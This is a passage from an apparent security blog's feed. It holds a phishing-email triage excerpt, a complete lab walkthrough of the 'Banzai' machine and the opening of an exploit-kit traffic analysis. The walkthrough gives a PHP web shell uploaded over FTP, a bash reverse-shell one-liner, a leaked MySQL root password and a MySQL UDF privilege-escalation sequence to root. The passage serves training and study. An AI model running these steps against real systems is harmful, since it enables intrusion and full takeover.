&lt;h4 id=&quot;email-6&quot;&gt;&lt;strong&gt;Email 6&lt;/strong&gt;&lt;/h4&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/ANZ_Social_Engineering/email6.png&quot; title=&quot;ANZ_Social_Engineering/email6.png&quot; alt=&quot;ANZ_Social_Engineering/email6.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Safe&lt;/code&gt;&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Both Reuben and Alan are using ANZ business email.&lt;/li&gt;
  &lt;li&gt;In general, the email looks legitimate and professional, while both the sender and responder seem to be on the same page.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;email-7&quot;&gt;&lt;strong&gt;Email 7&lt;/strong&gt;&lt;/h4&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/ANZ_Social_Engineering/email7.png&quot; title=&quot;ANZ_Social_Engineering/email7.png&quot; alt=&quot;ANZ_Social_Engineering/email7.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Malicious&lt;/code&gt;&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;The email contains one dubious link leading to a suspicious website.&lt;/li&gt;
  &lt;li&gt;Overall, the marketing email is not professional and lacks information but an address leads to an unknown source.&lt;/li&gt;
&lt;/ul&gt;</content><author><name></name></author><category term="blueteam" /><category term="socialengineering" /><category term="defense" /><summary type="html">Task Description You have been assigned 7 emails to investigate. Some of these emails may contain content which can be classed as malicious, due to a number of reasons. They may contain malicious attachments, suspicious links, or Phishing attempts to gather private account information from the user.</summary></entry><entry><title type="html">Banzai - OSPG</title><link href="https://jayngng.github.io/blog/banzai-ospg/" rel="alternate" type="text/html" title="Banzai - OSPG" /><published>2021-09-20T19:53:26+10:00</published><updated>2021-09-20T19:53:26+10:00</updated><id>https://jayngng.github.io/blog/banzai---ospg</id><content type="html" xml:base="https://jayngng.github.io/blog/banzai-ospg/">&lt;h1 id=&quot;summary&quot;&gt;&lt;strong&gt;Summary&lt;/strong&gt;&lt;/h1&gt;
&lt;p&gt;We’ll obtain the initial access by uploading a reverse shell onto the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FTP&lt;/code&gt; file share and triggering it via a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HTTP&lt;/code&gt; web application. We then escalate our privilege by exploiting &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MySQL UDF&lt;/code&gt; vulnerability.&lt;/p&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;enumeration&quot;&gt;&lt;strong&gt;Enumeration&lt;/strong&gt;&lt;/h1&gt;

&lt;h4 id=&quot;nmap&quot;&gt;&lt;strong&gt;Nmap&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;We’ll begin with a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; scan.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$IP&lt;/span&gt;
PORT     STATE SERVICE    REASON         VERSION
21/tcp   open  ftp        syn-ack ttl 63 vsftpd 3.0.3
22/tcp   open  ssh        syn-ack ttl 63 OpenSSH 7.4p1 Debian 10+deb9u7 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;protocol 
25/tcp   open  smtp       syn-ack ttl 63 Postfix smtpd
5432/tcp open  postgresql syn-ack ttl 63 PostgreSQL DB 9.6.4 - 9.6.6 or 9.6.13 - 9.6.17
8080/tcp open  http       syn-ack ttl 63 Apache httpd 2.4.25
|_http-server-header: Apache/2.4.25 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Debian&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_http-title: 403 Forbidden
8295/tcp open  http       syn-ack ttl 63 Apache httpd 2.4.25 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Debian&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.25 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Debian&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_http-title: Banzai
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Let’s us start with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FTP&lt;/code&gt; service.&lt;/p&gt;

&lt;h4 id=&quot;ftp-enumeration&quot;&gt;&lt;strong&gt;FTP Enumeration&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;We’ll utilize &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ftp&lt;/code&gt; command to access the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FTP&lt;/code&gt; file share.&lt;/p&gt;

&lt;p&gt;The credentials are: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin:admin&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ftp &lt;span class=&quot;nv&quot;&gt;$IP&lt;/span&gt;
Connected to 192.168.127.56.
220 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;vsFTPd 3.0.3&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Name &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;192.168.127.56:root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: admin
331 Please specify the password.
Password:
230 Login successful.
Remote system &lt;span class=&quot;nb&quot;&gt;type &lt;/span&gt;is UNIX.
Using binary mode to transfer files.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Listing all the accessible shares, we discover a potential web server is pointing to this &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FTP&lt;/code&gt; service.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ftp&amp;gt; &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-al&lt;/span&gt;
200 PORT &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    7 1001     0            4096 Jul 17  2020 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
drwxr-xr-x    7 1001     0            4096 Jul 17  2020 ..
drwxr-xr-x    2 1001     0            4096 May 26  2020 contactform
drwxr-xr-x    2 1001     0            4096 May 26  2020 css
drwxr-xr-x    3 1001     0            4096 May 26  2020 img
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;    1 1001     0           23364 May 27  2020 index.php
drwxr-xr-x    2 1001     0            4096 May 26  2020 js
drwxr-xr-x   11 1001     0            4096 May 26  2020 lib
226 Directory send OK.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now, let’s check if we can upload a malicious PHP file onto the service.&lt;/p&gt;

&lt;p&gt;From the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FTP&lt;/code&gt; interactive shell, we run the following command.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ftp&amp;gt; put cmback.php
&lt;span class=&quot;nb&quot;&gt;local&lt;/span&gt;: cmback.php remote: cmback.php
200 PORT &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
31 bytes sent &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;0.00 secs &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;378.4180 kB/s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The content of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cmback.php&lt;/code&gt; is:&lt;/p&gt;

&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;cmd&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The output indicates the file is successfully uploaded, we’ll now move on to enumerating &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HTTP&lt;/code&gt; service listening on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;port 8295&lt;/code&gt;&lt;/p&gt;

&lt;h4 id=&quot;http8295&quot;&gt;&lt;strong&gt;HTTP/8295&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;Investigate the service, we realize that the files from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FTP&lt;/code&gt; are accessible here.&lt;/p&gt;

&lt;p&gt;To prove the point, we can try to pull the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cmback.php&lt;/code&gt; file.&lt;/p&gt;

&lt;p&gt;This can be done with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;curl&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; http://192.168.127.56:8295/cmback.php

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Nothing returns means the file exists. Otherwise, it returns &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;404 Not Found&lt;/code&gt;.&lt;/p&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;exploitation&quot;&gt;&lt;strong&gt;Exploitation&lt;/strong&gt;&lt;/h1&gt;

&lt;h4 id=&quot;remote-code-execution-rce&quot;&gt;Remote Code Execution (RCE)&lt;/h4&gt;
&lt;p&gt;To confirm the RCE is achievable, we execute:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; http://192.168.127.56:8295/cmback.php&lt;span class=&quot;se&quot;&gt;\?&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id    
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The remaining steps are ease since we already got code execution.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Example of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bash&lt;/code&gt; reverse shell:&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-md highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bash -c &quot;bash -i &amp;gt;&amp;amp; /dev/tcp/$ip/$port 0&amp;gt;&amp;amp;1&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;It’s worth to URL-encode the payload.&lt;/p&gt;

&lt;p&gt;As everything is lined up, we are now ready to pull it …&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; http://192.168.127.56:8295/cmback.php&lt;span class=&quot;se&quot;&gt;\?&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&amp;lt;bash_revshell_here&amp;gt;    
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;and get a call back after a few seconds.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nc &lt;span class=&quot;nt&quot;&gt;-nlvp&lt;/span&gt; 8080                                                                                                                                                                         1 ⨯
listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 8080 ...
connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;192.168.49.127] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;192.168.127.56] 45134
bash: cannot &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;terminal process group &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;707&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: Inappropriate ioctl &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;device
bash: no job control &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;this shell
www-data@banzai:/var/www/html&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id
id
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;privilege-escalation&quot;&gt;&lt;strong&gt;Privilege Escalation&lt;/strong&gt;&lt;/h1&gt;

&lt;h4 id=&quot;mysql-credentials&quot;&gt;&lt;strong&gt;MySQL Credentials&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;Gathering the system locally divulges a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;config.php&lt;/code&gt;, which secure &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt; credentials of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MySQL&lt;/code&gt; service.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@banzai:/var/www&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;config.php 
&amp;lt;?php
define&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;DBHOST&apos;&lt;/span&gt;, &lt;span class=&quot;s1&quot;&gt;&apos;127.0.0.1&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
define&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;DBUSER&apos;&lt;/span&gt;, &lt;span class=&quot;s1&quot;&gt;&apos;root&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
define&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;DBPASS&apos;&lt;/span&gt;, &lt;span class=&quot;s1&quot;&gt;&apos;EscalateRaftHubris123&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
define&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;DBNAME&apos;&lt;/span&gt;, &lt;span class=&quot;s1&quot;&gt;&apos;main&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;mysql-udf&quot;&gt;&lt;strong&gt;MySQL UDF&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;Further enumeration reveals the current &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MySQL&lt;/code&gt; service is vulnerable to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;User-Defined Function (UDF)&lt;/code&gt; exploit.&lt;/p&gt;

&lt;p&gt;More information can be found: &lt;a href=&quot;https://www.exploit-db.com/exploits/1518&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Steps to reproduce the attacks:&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;[1].&lt;/strong&gt; Save and upload the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;raptor_udf2.c&lt;/code&gt; &lt;a href=&quot;https://www.exploit-db.com/exploits/1518&quot;&gt;exploit&lt;/a&gt; onto &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/dev/shm&lt;/code&gt; directory of the target system.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;[2].&lt;/strong&gt; Compile &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;raptor_udf2.c&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@banzai:/dev/shm&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;gcc &lt;span class=&quot;nt&quot;&gt;-g&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; raptor_udf2.c
www-data@banzai:/dev/shm&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;gcc &lt;span class=&quot;nt&quot;&gt;-g&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-shared&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Wl&lt;/span&gt;,-soname,raptor_udf2.so &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; raptor_udf2.so raptor_udf2.o &lt;span class=&quot;nt&quot;&gt;-lc&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;[3].&lt;/strong&gt; Now, we can drop a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MySQL&lt;/code&gt; interactive shell with the credentials.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@banzai:/dev/shm&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;mysql &lt;span class=&quot;nt&quot;&gt;-uroot&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-pEscalateRaftHubris123&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;[4].&lt;/strong&gt; From the shell, we continue executing …&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mysql&amp;gt; use mysql&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
mysql&amp;gt; create table foo&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;line blob&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
mysql&amp;gt; insert into foo values&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;load_file&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;/dev/shm/raptor_udf2.so&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
mysql&amp;gt; &lt;span class=&quot;k&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; from foo into dumpfile &lt;span class=&quot;s1&quot;&gt;&apos;/usr/lib/mysql/plugin/raptor_udf2.so&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
mysql&amp;gt; create &lt;span class=&quot;k&quot;&gt;function &lt;/span&gt;do_system returns integer soname &lt;span class=&quot;s1&quot;&gt;&apos;raptor_udf2.so&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
mysql&amp;gt; &lt;span class=&quot;k&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; from mysql.func&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+-----------+-----+----------------+----------+
| name      | ret | dl             | &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;     |
+-----------+-----+----------------+----------+
| do_system |   2 | raptor_udf2.so | &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; |
+-----------+-----+----------------+----------+
mysql&amp;gt; &lt;span class=&quot;k&quot;&gt;select &lt;/span&gt;do_system&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;chmod +s /bin/bash&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+---------------------------------+
| do_system&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;chmod +s /bin/bash&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; |
+---------------------------------+
|                               0 |
+---------------------------------+
1 row &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;set&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.00 sec&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;and successfully compromise &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt; access.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mysql&amp;gt; &lt;span class=&quot;se&quot;&gt;\!&lt;/span&gt; sh
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;/bin/bash &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt;
bash-4.4# &lt;span class=&quot;nb&quot;&gt;whoami
&lt;/span&gt;root
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name></name></author><category term="ctf" /><category term="pg" /><category term="linux" /><summary type="html">Summary We’ll obtain the initial access by uploading a reverse shell onto the FTP file share and triggering it via a HTTP web application. We then escalate our privilege by exploiting MySQL UDF vulnerability.</summary></entry><entry><title type="html">Magnitude EK - Traffic Analysis</title><link href="https://jayngng.github.io/blog/magnitude-ek-traffic-analysis/" rel="alternate" type="text/html" title="Magnitude EK - Traffic Analysis" /><published>2021-09-19T03:18:51+10:00</published><updated>2021-09-19T03:18:51+10:00</updated><id>https://jayngng.github.io/blog/magnitude-ek---traffic-analysis</id><content type="html" xml:base="https://jayngng.github.io/blog/magnitude-ek-traffic-analysis/">&lt;h2 id=&quot;description&quot;&gt;&lt;strong&gt;Description&lt;/strong&gt;&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;You have a pcap, and you need to figure out what’s going on.  What’s happening here?&lt;/li&gt;
  &lt;li&gt;Download the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.pcap&lt;/code&gt; &lt;a href=&quot;https://www.malware-traffic-analysis.net/2015/05/08/2015-05-08-traffic-analysis-exercise.pcap.zip&quot;&gt;here.&lt;/a&gt;
(The password is: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;infected&lt;/code&gt;).&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;Credit:&lt;/strong&gt; malware-traffic-analysis.net&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;traffic-overview&quot;&gt;&lt;strong&gt;Traffic Overview&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;Tools used:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Wireshark&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Squert&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;snort&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tcpreplay&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;protocol-hierarchy&quot;&gt;&lt;strong&gt;Protocol Hierarchy&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;Most of the traffic are generated by the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HTTP&lt;/code&gt; protocol.&lt;/p&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/magnitude_ek/protocol_hierarchy.png&quot; title=&quot;magnitude_ek/protocol_hierarchy.png&quot; alt=&quot;magnitude_ek/protocol_hierarchy.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;That said, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HTTP&lt;/code&gt; is our target of investigation.&lt;/p&gt;

&lt;h4 id=&quot;ip-addresses&quot;&gt;&lt;strong&gt;IP Addresses&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Wireshark&lt;/code&gt; allows us to summarize the IP addresses engaged in the traffic.&lt;/p&gt;

&lt;p&gt;This can be done by navigating to:
